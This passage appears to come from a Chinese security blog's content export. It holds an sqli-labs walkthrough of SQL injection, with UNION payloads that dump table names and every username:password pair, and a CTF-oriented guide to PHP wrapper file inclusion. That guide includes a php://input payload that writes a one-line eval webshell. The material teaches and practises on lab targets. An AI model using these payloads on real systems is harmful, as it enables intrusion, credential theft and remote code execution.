target=\"_blank\" rel=\"noopener\">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name=&#39;admin&#39;</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>\n<p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> 我们需要将这些烦人的引号给处理掉。</p>\n<h3 id=\"（3）搜索型注入点\"><a href=\"#（3）搜索型注入点\" class=\"headerlink\" title=\"（3）搜索型注入点\"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>\n<p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>\n<blockquote>\n<p>按照数据提交的方式来分类</p>\n</blockquote>\n<h3 id=\"（1）GET-注入\"><a href=\"#（1）GET-注入\" class=\"headerlink\" title=\"（1）GET 注入\"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href=\"http://xxx.com/index.php?id=1\" target=\"_blank\" rel=\"noopener\">http://xxx.com/index.php?id=1</a> , id 是注入点。</p>\n<h3 id=\"（2）POST-注入\"><a href=\"#（2）POST-注入\" class=\"headerlink\" title=\"（2）POST 注入\"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>\n<h3 id=\"（3）Cookie-注入\"><a href=\"#（3）Cookie-注入\" class=\"headerlink\" title=\"（3）Cookie 注入\"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>\n<h3 id=\"（4）HTTP-头部注入\"><a href=\"#（4）HTTP-头部注入\" class=\"headerlink\" title=\"（4）HTTP 头部注入\"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>\n<blockquote>\n<p>按照执行效果来分类</p>\n</blockquote>\n<h3 id=\"（1）基于布尔的盲注\"><a href=\"#（1）基于布尔的盲注\" class=\"headerlink\" title=\"（1）基于布尔的盲注\"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>\n<h3 id=\"（2）基于时间的盲注\"><a href=\"#（2）基于时间的盲注\" class=\"headerlink\" title=\"（2）基于时间的盲注\"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>\n<h3 id=\"（3）基于报错注入\"><a href=\"#（3）基于报错注入\" class=\"headerlink\" title=\"（3）基于报错注入\"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<ol>\n<li>单引号</li>\n<li>双引号</li>\n<li>基于数字型注入</li>\n</ol>\n<h3 id=\"（4）联合查询注入\"><a href=\"#（4）联合查询注入\" class=\"headerlink\" title=\"（4）联合查询注入\"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>\n<h3 id=\"（5）堆查询注入\"><a href=\"#（5）堆查询注入\" class=\"headerlink\" title=\"（5）堆查询注入\"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p>\n<h3 id=\"（6）宽字节注入\"><a href=\"#（6）宽字节注入\" class=\"headerlink\" title=\"（6）宽字节注入\"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p>\n<h3 id=\"基于sqli-labs的实践操作\"><a href=\"#基于sqli-labs的实践操作\" class=\"headerlink\" title=\"基于sqli-labs的实践操作\"></a>基于sqli-labs的实践操作</h3><h4 id=\"1-基于报错的GET-sql注入\"><a href=\"#1-基于报错的GET-sql注入\" class=\"headerlink\" title=\"1.基于报错的GET sql注入\"></a>1.基于报错的GET sql注入</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p><img src=\"/img/less-1.png\" alt></p>\n<p>提示说输入一个数字作为ID的值</p>\n<p>那么先在url输入?id=1</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id=1.png\" alt></p>\n<p>显示查询成功，返回了用户Dumb</p>\n<p>然后尝试使其报错，输入 ?id=1’</p>\n<p><img src=\"/img/less-1%E8%BE%93%E5%85%A5id-1'.png\" alt></p>\n<p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p>\n<p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p>\n<p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p>\n<p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = &#39;$id&#39; limit 0,1 &quot;</code></pre>\n<p> id被单引号包裹，这是字符型注入点</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p><img src=\"/img/less-2.png\" alt></p>\n<p>流程与上面差不多</p>\n<p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p>\n<p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p>\n<p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p>\n<p>由此可以看出后台语句大致是 </p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id =$ id limit 0,1 &quot;</code></pre>\n<p>id没有被单引号包裹，这是一个数字型注入点</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p><img src=\"/img/less-3.png\" alt></p>\n<p>这次的报错是 ‘’1’’) LIMIT 0,1’</p>\n<p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p>\n<p>显然，后台语句是</p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = (&#39;$id&#39;) limit 0,1 &quot;</code></pre>\n<p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p>\n<p>比如上面这个less-3</p>\n<p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p>\n<p><img src=\"/img/--+.png\" alt></p>\n<p>![](/img/– .png)</p>\n<p>都成功了，这就说明后台语句和我们想的八九不离十了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p>\n<p>那就使用\\来制造报错，输入 id=1\\</p>\n<p>返回报错 ‘“1\\“) LIMIT 0,1’–&gt;”1\\“) LIMIT 0,1</p>\n<p>\\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p>\n<p>合理推测：</p>\n<pre><code class=\"mysql\">&quot;SELECT username,password FROM user WHERE id = (&quot;id&quot;) limit 0,1 &quot;</code></pre>\n<p>验证：</p>\n<p><img src=\"/img/less-4.png\" alt></p>\n<p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p>\n<p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p>\n<p>例如less-1(字符型) 就可以输入?id=1’ order by 1(,2,3,4… ) –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p>\n<p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p>\n<p>我们要构造的语句是SELECT username,password FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p>\n<p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p>\n<p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p>\n<p>效果</p>\n<p><img src=\"/img/union%E6%B3%A8%E5%85%A5.png\" alt></p>\n<p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p>\n<p>于是接下来注入 id=0’ union select 1,user(),database() –+</p>\n<p><img src=\"/img/union%E7%88%86%E5%BA%93.png\" alt></p>\n<p>爆出了用户名和使用的数据库名</p>\n<p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p>\n<p>例如：</p>\n<p>爆表：</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+</code></pre>\n<p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p>\n<p><img src=\"/img/union%E7%88%86%E8%A1%A8.png\" alt></p>\n<p>看到了最后一个表是’users’,可用于下一步爆字段</p>\n<p>爆字段：</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(column_name),database() from information_schema.columns where table_name=&#39;users&#39; --+</code></pre>\n<p><img src=\"/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png\" alt></p>\n<p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p>\n<pre><code class=\"mysql\">id=0&#39; union select 1,group_concat(username,0x3a,password),3 from users --+</code></pre>\n<p><img src=\"E:/%E6%96%87%E6%A1%A3/Github%E4%BB%93%E5%BA%93/LiGuHeiYi/LiGuHeiYi.github.io/_posts/img/union%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png\" alt></p>\n<p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p>\n"},{"layout":"post","title":"PHP 伪协议","date":"2020-11-07T16:00:00.000Z","description":"偷源码的利器","typora-copy-images-to":"..\\img","_content":"\n# PHP伪协议\n\n## `file://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:off/on\n  - `allow_url_include` :off/on\n\n- **作用**：\n  用于访问本地文件系统，在CTF中通常用来**读取本地文件**的且不受`allow_url_fopen`与`allow_url_include`的影响。\n  `include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照php语法进行解析，这是`include()`函数所决定的。\n\n- **说明**：\n  `file://` 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 `fopen()` 和 `file_get_contents()`，`include_path `会可选地搜索，也作为相对的路径。\n\n- **用法**：\n\n  ```\n  /path/to/file.ext\n  relative/path/to/file.ext\n  fileInCwd.ext\n  C:/path/to/winfile.ext\n  C:\\path\\to\\winfile.ext\n  \\\\smbserver\\share\\path\\to\\winfile.ext\n  file:///path/to/file.ext\n  ```\n\n- **示例**：\n\n  1. `file://[文件的绝对路径和文件名]`\n\n     ```\n     http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQAZ)\n\n  2. `[文件的相对路径和文件名]`\n\n     ```\n     http://127.0.0.1/include.php?file=./phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQA1)\n\n  3. `[http：//网络路径和文件名]`\n\n     ```\n     http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBb)\n\n- **参考**：http://php.net/manual/zh/wrappers.file.php\n\n## `php://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:off/on\n  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp `需要on\n\n- **作用**：\n  `php://` 访问各个输入/输出流（I/O streams），在CTF中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于**执行php代码**。\n\n- **说明**：\n  PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，\n  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。\n\n  | 协议                    | 作用                                                         |\n  | ----------------------- | ------------------------------------------------------------ |\n  | php://input             | 可以访问请求的原始数据的只读流，在POST请求中访问POST的`data`部分，在`enctype=\"multipart/form-data\"` 的时候`php://input `是无效的。 |\n  | php://output            | 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 |\n  | php://fd                | (>=5.3.6)允许直接访问指定的文件描述符。例如 `php://fd/3` 引用了文件描述符 3。 |\n  | php://memory php://temp | (>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 `php://memory` 总是把数据储存在内存中，而 `php://temp` 会在内存量达到预定义的限制后（默认是 `2MB`）存入临时文件中。临时文件位置的决定和 `sys_get_temp_dir()` 的方式一致。 |\n  | php://filter            | (>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式`（all-in-one）`的文件函数非常有用，类似 `readfile()`、`file()` 和 `file_get_contents()`，在数据流内容读取之前没有机会应用其他过滤器。 |\n\n- **`php://filter`参数详解**\n\n  该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：\n\n  | php://filter 参数         | 描述                                                         |           |\n  | ------------------------- | ------------------------------------------------------------ | --------- |\n  | resource=<要过滤的数据流> | 必须项。它指定了你要筛选过滤的数据流。                       |           |\n  | read=<读链的过滤器>       | 可选项。可以设定一个或多个过滤器名称，以管道符（*\\           | *）分隔。 |\n  | write=<写链的过滤器>      | 可选项。可以设定一个或多个过滤器名称，以管道符（\\            | ）分隔。  |\n  | <; 两个链的过滤器>        | 任何没有以 *read=* 或 *write=* 作前缀的筛选器列表会视情况应用于读或写链。 |           |\n\n- **可用的过滤器列表（4类）**\n\n  此处列举主要的过滤器类型，详细内容请参考：https://www.php.net/manual/zh/filters.php\n\n  | 字符串过滤器      | 作用                                        |\n  | ----------------- | ------------------------------------------- |\n  | string.rot13      | 等同于`str_rot13()`，rot13变换              |\n  | string.toupper    | 等同于`strtoupper()`，转大写字母            |\n  | string.tolower    | 等同于`strtolower()`，转小写字母            |\n  | string.strip_tags | 等同于`strip_tags()`，去除html、PHP语言标签 |\n\n  | 转换过滤器                                                   | 作用                                                       |\n  | ------------------------------------------------------------ | ---------------------------------------------------------- |\n  | convert.base64-encode & convert.base64-decode                | 等同于`base64_encode()`和`base64_decode()`，base64编码解码 |\n  | convert.quoted-printable-encode & convert.quoted-printable-decode | quoted-printable 字符串与 8-bit 字符串编码解码             |\n\n  | 压缩过滤器                        | 作用                                                         |\n  | --------------------------------- | ------------------------------------------------------------ |\n  | zlib.deflate & zlib.inflate       | 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |\n  | bzip2.compress & bzip2.decompress | 同上，在本地文件系统中创建 bz2 兼容文件的方法。              |\n\n  | 加密过滤器 | 作用                   |\n  | ---------- | ---------------------- |\n  | mcrypt.*   | libmcrypt 对称加密算法 |\n  | mdecrypt.* | libmcrypt 对称解密算法 |\n\n- **示例**：\n\n  1. `php://filter/read=convert.base64-encode/resource=[文件名]`读取文件源码（针对php文件需要base64编码）\n\n     ```\n     http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBf)\n\n  2. `php://input + [POST DATA]`执行php代码\n\n     ```\n     http://127.0.0.1/include.php?file=php://input\n     [POST DATA部分]\n     <?php phpinfo(); ?>\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBh)\n\n     若有写入权限，写入一句话木马\n\n     ```\n     http://127.0.0.1/include.php?file=php://input\n     [POST DATA部分]\n     <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBi)\n\n- **参考**：https://php.net/manual/zh/wrappers.php.php\n\n## `zip:// & bzip2:// & zlib://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:off/on\n  - `allow_url_include` :off/on\n\n- **作用**：`zip:// & bzip2:// & zlib://` 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx` 等等。\n\n- **示例**：\n\n  1. `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）\n\n     压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传\n\n     ```\n     http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBj)\n\n  2. `compress.bzip2://file.bz2`\n\n     压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）\n\n     ```\n     http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBt)\n\n  3. `compress.zlib://file.gz`\n\n     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）\n\n     ```\n     http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBu)\n\n- **参考**：http://php.net/manual/zh/wrappers.compression.php\n\n## `data://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:on\n  - `allow_url_include` :on\n\n- **作用**：自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。\n\n- **用法**：\n\n  ```\n  data://text/plain,\n  data://text/plain;base64,\n  ```\n\n- **示例**：\n\n  1. `data://text/plain,`\n\n     ```\n     http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBB)\n\n  2. `data://text/plain;base64,`\n\n     ```\n     http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBD)\n\n## `http:// & https://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:on\n  - `allow_url_include` :on\n\n- **作用**：常规 URL 形式，允许通过 `HTTP 1.0` 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。\n\n- **用法**：\n\n  ```\n  http://example.com\n  http://example.com/file.php?var1=val1&var2=val2\n  http://user:password@example.com\n  https://example.com\n  https://example.com/file.php?var1=val1&var2=val2\n  https://user:password@example.com\n  ```\n\n- **示例**：\n\n  ```\n  http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n  ```\n\n  ![图片描述](https://segmentfault.com/img/bVbrQBP)\n\n## `phar://` 协议\n\n`phar://`协议与`zip://`类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：\n\n```\nhttp://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\n```\n\n![图片描述](https://segmentfault.com/img/bVbrQBX)\n\n另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。\n\n因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。\n\n参考文章：[seebug - 利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)\n\n","source":"_posts/2020-11-08-PHP伪协议.md","raw":"---\nlayout: post\ntitle: PHP 伪协议\ndate: 2020-11-08\ncategories: blog\ntags: [web,PHP]\ndescription: 偷源码的利器\ntypora-copy-images-to: ..\\img\n---\n\n# PHP伪协议\n\n## `file://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:off/on\n  - `allow_url_include` :off/on\n\n- **作用**：\n  用于访问本地文件系统，在CTF中通常用来**读取本地文件**的且不受`allow_url_fopen`与`allow_url_include`的影响。\n  `include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照php语法进行解析，这是`include()`函数所决定的。\n\n- **说明**：\n  `file://` 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 `fopen()` 和 `file_get_contents()`，`include_path `会可选地搜索，也作为相对的路径。\n\n- **用法**：\n\n  ```\n  /path/to/file.ext\n  relative/path/to/file.ext\n  fileInCwd.ext\n  C:/path/to/winfile.ext\n  C:\\path\\to\\winfile.ext\n  \\\\smbserver\\share\\path\\to\\winfile.ext\n  file:///path/to/file.ext\n  ```\n\n- **示例**：\n\n  1. `file://[文件的绝对路径和文件名]`\n\n     ```\n     http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQAZ)\n\n  2. `[文件的相对路径和文件名]`\n\n     ```\n     http://127.0.0.1/include.php?file=./phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQA1)\n\n  3. `[http：//网络路径和文件名]`\n\n     ```\n     http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBb)\n\n- **参考**：http://php.net/manual/zh/wrappers.file.php\n\n## `php://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:off/on\n  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp `需要on\n\n- **作用**：\n  `php://` 访问各个输入/输出流（I/O streams），在CTF中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于**执行php代码**。\n\n- **说明**：\n  PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，\n  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。\n\n  | 协议                    | 作用                                                         |\n  | ----------------------- | ------------------------------------------------------------ |\n  | php://input             | 可以访问请求的原始数据的只读流，在POST请求中访问POST的`data`部分，在`enctype=\"multipart/form-data\"` 的时候`php://input `是无效的。 |\n  | php://output            | 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 |\n  | php://fd                | (>=5.3.6)允许直接访问指定的文件描述符。例如 `php://fd/3` 引用了文件描述符 3。 |\n  | php://memory php://temp | (>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 `php://memory` 总是把数据储存在内存中，而 `php://temp` 会在内存量达到预定义的限制后（默认是 `2MB`）存入临时文件中。临时文件位置的决定和 `sys_get_temp_dir()` 的方式一致。 |\n  | php://filter            | (>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式`（all-in-one）`的文件函数非常有用，类似 `readfile()`、`file()` 和 `file_get_contents()`，在数据流内容读取之前没有机会应用其他过滤器。 |\n\n- **`php://filter`参数详解**\n\n  该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：\n\n  | php://filter 参数         | 描述                                                         |           |\n  | ------------------------- | ------------------------------------------------------------ | --------- |\n  | resource=<要过滤的数据流> | 必须项。它指定了你要筛选过滤的数据流。                       |           |\n  | read=<读链的过滤器>       | 可选项。可以设定一个或多个过滤器名称，以管道符（*\\           | *）分隔。 |\n  | write=<写链的过滤器>      | 可选项。可以设定一个或多个过滤器名称，以管道符（\\            | ）分隔。  |\n  | <; 两个链的过滤器>        | 任何没有以 *read=* 或 *write=* 作前缀的筛选器列表会视情况应用于读或写链。 |           |\n\n- **可用的过滤器列表（4类）**\n\n  此处列举主要的过滤器类型，详细内容请参考：https://www.php.net/manual/zh/filters.php\n\n  | 字符串过滤器      | 作用                                        |\n  | ----------------- | ------------------------------------------- |\n  | string.rot13      | 等同于`str_rot13()`，rot13变换              |\n  | string.toupper    | 等同于`strtoupper()`，转大写字母            |\n  | string.tolower    | 等同于`strtolower()`，转小写字母            |\n  | string.strip_tags | 等同于`strip_tags()`，去除html、PHP语言标签 |\n\n  | 转换过滤器                                                   | 作用                                                       |\n  | ------------------------------------------------------------ | ---------------------------------------------------------- |\n  | convert.base64-encode & convert.base64-decode                | 等同于`base64_encode()`和`base64_decode()`，base64编码解码 |\n  | convert.quoted-printable-encode & convert.quoted-printable-decode | quoted-printable 字符串与 8-bit 字符串编码解码             |\n\n  | 压缩过滤器                        | 作用                                                         |\n  | --------------------------------- | ------------------------------------------------------------ |\n  | zlib.deflate & zlib.inflate       | 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |\n  | bzip2.compress & bzip2.decompress | 同上，在本地文件系统中创建 bz2 兼容文件的方法。              |\n\n  | 加密过滤器 | 作用                   |\n  | ---------- | ---------------------- |\n  | mcrypt.*   | libmcrypt 对称加密算法 |\n  | mdecrypt.* | libmcrypt 对称解密算法 |\n\n- **示例**：\n\n  1. `php://filter/read=convert.base64-encode/resource=[文件名]`读取文件源码（针对php文件需要base64编码）\n\n     ```\n     http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBf)\n\n  2. `php://input + [POST DATA]`执行php代码\n\n     ```\n     http://127.0.0.1/include.php?file=php://input\n     [POST DATA部分]\n     <?php phpinfo(); ?>\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBh)\n\n     若有写入权限，写入一句话木马\n\n     ```\n     http://127.0.0.1/include.php?file=php://input\n     [POST DATA部分]\n     <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBi)\n\n- **参考**：https://php.net/manual/zh/wrappers.php.php\n\n## `zip:// & bzip2:// & zlib://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:off/on\n  - `allow_url_include` :off/on\n\n- **作用**：`zip:// & bzip2:// & zlib://` 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx` 等等。\n\n- **示例**：\n\n  1. `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）\n\n     压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传\n\n     ```\n     http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBj)\n\n  2. `compress.bzip2://file.bz2`\n\n     压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）\n\n     ```\n     http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBt)\n\n  3. `compress.zlib://file.gz`\n\n     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）\n\n     ```\n     http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBu)\n\n- **参考**：http://php.net/manual/zh/wrappers.compression.php\n\n## `data://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:on\n  - `allow_url_include` :on\n\n- **作用**：自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。\n\n- **用法**：\n\n  ```\n  data://text/plain,\n  data://text/plain;base64,\n  ```\n\n- **示例**：\n\n  1. `data://text/plain,`\n\n     ```\n     http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBB)\n\n  2. `data://text/plain;base64,`\n\n     ```\n     http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n     ```\n\n     ![图片描述](https://segmentfault.com/img/bVbrQBD)\n\n## `http:// & https://` 协议\n\n- **条件**：\n\n  - `allow_url_fopen`:on\n  - `allow_url_include` :on\n\n- **作用**：常规 URL 形式，允许通过 `HTTP 1.0` 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。\n\n- **用法**：\n\n  ```\n  http://example.com\n  http://example.com/file.php?var1=val1&var2=val2\n  http://user:password@example.com\n  https://example.com\n  https://example.com/file.php?var1=val1&var2=val2\n  https://user:password@example.com\n  ```\n\n- **示例**：\n\n  ```\n  http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n  ```\n\n  